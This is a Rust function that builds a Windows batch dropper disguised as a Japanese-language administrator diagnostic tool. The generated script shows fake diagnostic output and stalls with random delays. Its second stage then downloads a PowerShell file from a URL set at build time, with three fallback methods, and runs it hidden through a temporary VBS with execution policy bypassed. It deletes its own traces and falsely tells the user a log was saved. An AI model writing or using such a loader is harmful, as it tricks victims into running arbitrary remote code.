fn build_script(url: &str, ps1_name: &str) -> String {
    let tpl = r#"@echo off
setlocal enabledelayedexpansion

:: === Delay Functions ===
:SleepS
rem Usage: call :SleepS ^<seconds^>
ping -n %1 127.0.0.1 ^>nul
goto :eof

:SleepMS
rem Usage: call :SleepMS ^<milliseconds^>
powershell -Command "Start-Sleep -Milliseconds %1" ^>nul
goto :eof

title [管理者診断ユーティリティ]
color 0A

echo =====================================================
echo           管理者用ネットワーク／システム診断ユーティリティ
echo =====================================================
echo [+] 初期化中...
call :SleepS 2

:: Fake diagnostic functions
echo [INFO] ネットワークスタック確認中...
netsh winsock show catalog ^>nul
call :SleepS 1
echo [INFO] システムリソースの照会...
fsutil behavior query DisableDeleteNotify ^>nul
call :SleepS 1
echo [INFO] DCOM設定の確認...
dcomcnfg /32 ^>nul
call :SleepS 1

echo [INFO] ユーザーアクティビティを確認中...
wevtutil qe Security "/q:*[System[(EventID=4624)]]" /f:text /c:1 ^>nul
call :SleepS 1

echo [INFO] 不審な接続をスキャン中...
netstat -bno ^>nul
route print ^>nul
call :SleepS 1

echo [INFO] システムサービス確認中...
sc queryex type= service ^>nul
call :SleepS 1

echo [INFO] WMI チェック中...
wmic logicaldisk get caption,filesystem,freespace,size ^>nul
call :SleepS 1

echo [INFO] CPU 負荷チェック...
wmic cpu get loadpercentage ^>nul
call :SleepS 1

echo [INFO] メモリ空き容量チェック...
systeminfo | findstr /C:"Available Physical Memory" ^>nul
call :SleepS 1

echo [INFO] レジストリ設定検証...
reg query HKLM\SOFTWARE ^>nul
call :SleepS 1

:: 50x random sub-sleeps
echo [*] 詳細検証を実行中... (50 ステップ)
for /l %%i in (1,1,50) do (
    set /a delay=(%RANDOM%  %% 60) + 120
    call :SleepMS !delay!
)

:: Random delay before launching stage 2
set /a mainDelay=(%RANDOM%  %% 4) + 3
echo [INFO] 補助診断モジュールを準備中... (%mainDelay% 秒後に実行)
call :SleepS %mainDelay%

:: Build second stage BAT (stage2.bat)
set "stage2=%~dp0stage2.bat"
(
    echo @echo off
    echo setlocal enabledelayedexpansion

    echo :: === Delay Functions ===
    echo :SleepS
    echo rem Usage: call :SleepS ^<seconds^>
    echo ping -n %%1 127.0.0.1 ^>nul
    echo goto :eof
    echo
    echo :SleepMS
    echo rem Usage: call :SleepMS ^<milliseconds^>
    echo powershell -Command "Start-Sleep -Milliseconds %%1" ^>nul
    echo goto :eof
    echo

    echo title 補助診断モジュール
    echo echo [*] ネットワークテストを再実行中...
    echo ping -n 2 1.1.1.1 ^>nul
    echo tracert -h 2 8.8.8.8
    echo ipconfig /flushdns
    echo call :SleepS 2

    echo echo [*] ランダム遅延を実行中...
    echo set /a delay2=(%%RANDOM%%  %% 8) + 3
    echo call :SleepS !delay2!

    echo echo [*] GitHub からモジュールを取得中...
    echo set "url={{URL}}"
    echo set "outfile=%%~dp0{{OUTFILE}}"
    echo powershell -Command "try { Invoke-WebRequest -Uri '!url!' -OutFile '!outfile!' -UseBasicParsing } catch { try { Start-BitsTransfer -Source '!url!' -Destination '!outfile!' } catch { $wc = New-Object System.Net.WebClient; $wc.DownloadFile('!url!','!outfile!') } }"
    echo if not exist "!outfile!" (
    echo     echo [ERROR] ダウンロードに失敗しました。
    echo     exit /b 1
    echo )
    echo call :SleepS 2

    echo echo [*] ステルス起動用VBSを生成中...
    echo ^(
    echo Set shell = CreateObject("WScript.Shell")
    echo shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""!outfile!""", 0, False
    echo ^) ^> "%%~dp0launch_hidden.vbs"
    echo call :SleepS 1

    echo echo [*] スクリプト実行中...
    echo cscript //nologo "%%~dp0launch_hidden.vbs"
    echo del "%%~dp0launch_hidden.vbs" ^>nul
    echo del "%%stage2%%" ^>nul
    echo echo [*] 補助診断完了。
) > "%stage2%"

:: Random delay before running stage 2
set /a rdelay=(%RANDOM%  %% 5) + 2
echo [INFO] stage2.bat を %rdelay% 秒後に実行します...
call :SleepS %rdelay%

:: Run stage2
call "%stage2%"

echo [√] 全診断完了。ログは "{{OUTFILE}}" に保存されました。
call :SleepS 2
pause
exit
"#;

    tpl.replace("{{URL}}", url)
       .replace("{{OUTFILE}}", ps1_name)
}
